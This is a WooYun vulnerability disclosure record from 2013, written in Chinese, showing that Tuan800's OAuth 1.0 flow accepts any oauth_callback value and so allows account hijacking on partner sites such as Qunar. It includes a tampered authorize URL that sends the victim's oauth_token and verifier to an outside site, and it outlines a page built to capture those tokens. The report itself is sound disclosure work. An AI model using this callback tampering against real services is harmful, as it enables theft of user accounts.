{"id": 9885, "wybug_id": "wooyun-2013-031954", "wybug_title": "团800oauth缺陷可能导用户帐号被劫持", "wybug_corp": "团800", "wybug_author": "VIP", "wybug_date": "2013-07-23 17:08", "wybug_open_date": "2013-09-06 17:09", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-06：\t细节向公众公开  简要描述： 团800给站长提供了一个oauth api，所有网站都可以通过这个API实现团800帐号登录自己的网站。但是，在团800oauth认证流程中存在一个缺陷，可导致使用该网站oauth api的网站用户帐号都可被劫持，这里用去哪儿网（使用了团800 oauth api）做个测试。 详细说明：  团800使用的oauth版本是oauth1.0，聪明的你想到了什么？没错，oauth1.0中存在着一个严重缺陷，就是没有对回调参数oauth_callback做限制，导致可以回调到任意网站。去哪儿网在团800的授权网址是这样的：\nhttp://api.tuan800.com/oauth/oauth/authorize?oauth_token=91ee14dfe2174d4286a2f8889d85f29d&oauth_callback=http%3A%2F%2Foauth.qunar.com%2Foauth-client%2Ftuan800%2Flogin%3Foauth_secret%3D27e05124d45b2131e3e5e20181f260ac\n那么，恶意篡改oauth_callback的值\nhttp://api.tuan800.com/oauth/oauth/authorize?oauth_token=efeda64521c2576a827769384c045cd0&oauth_callback=http://wooyun.org\n当用户点击授权后，就会把oauth_verifier和oauth_token回调到攻击者的网址，攻击者获得了这两个值后，就可以任意登录用户帐号了。如果攻击者设置好一个接受这两个值的网页，接收到入库后又回调到相应的网站，简直是天衣无缝啊！！！！！！   漏洞证明：  \n\n   修复方案：  升级到oauth2.0，强制所有使用了原1.0API的网站升级。   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-07-24 10:13 厂商回复： 感谢您对团800的支持，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-23 19:43 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  厂商还是挺有效率的，下午去联系了下，就来认领了。    \n     2013-07-23 22:12 |    \t\ttzrj \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        | 1111)\t\t \n  @VIP  前排围观小学生。。。    \n     2013-07-24 09:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  洞主是rank最高的实习    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}